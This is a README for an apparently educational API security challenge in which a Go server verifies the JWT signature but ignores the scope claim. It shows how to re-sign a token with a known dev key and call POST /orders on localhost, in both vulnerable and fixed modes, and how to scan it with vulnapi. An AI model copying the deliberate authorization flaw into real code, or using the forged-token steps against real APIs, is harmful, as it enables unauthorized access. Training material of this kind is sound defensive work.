# JWT Scope Not Validated

This challenge demonstrates an API that verifies the JWT signature and expiry but never checks the `scope` claim. `POST /orders` is meant to require the `orders:write` scope, yet a token re-signed without any scope or role claim is accepted. The operation only answers `POST` with a JSON body, so a scanner that sends a plain `GET` misses it.

## How to run it

```bash
go run main.go serve
```

## Modes

The server supports two modes, toggled with the `--vulnerable` flag on the `serve` command (defaults to `true`):

```bash
# vulnerable: the scope claim is ignored
go run main.go serve --vulnerable=true

# fixed: POST /orders requires the orders:write scope (403 otherwise)
go run main.go serve --vulnerable=false
```

## How to exploit it

The signing key is a known dev secret (`scope-dev-key`), as would be recovered by a secret-cracking tool.

```bash
TOKEN=$(go run main.go jwt)
curl -i -X POST http://localhost:8080/orders -H "Authorization: Bearer $TOKEN" -d '{"item": "book"}'
# -> 201 Created

vulnapi scan curl -X POST http://localhost:8080/orders -H "Authorization: Bearer $TOKEN" -d '{"item": "book"}' --jwt-secret scope-dev-key
# vulnerable: jwt.scope_not_validated, the token re-signed without scope gets 201
# fixed: no finding, the same token gets 403
```

## Disclaimer

The challenges provided in this repository are designed to be educational and for testing purposes only. Do not attempt to exploit vulnerabilities in systems or APIs without proper authorization. Always ensure that you have the necessary permissions to conduct security testing on any system or application.

---

Learn more about API security at [Cerberauth](https://www.cerberauth.com/)
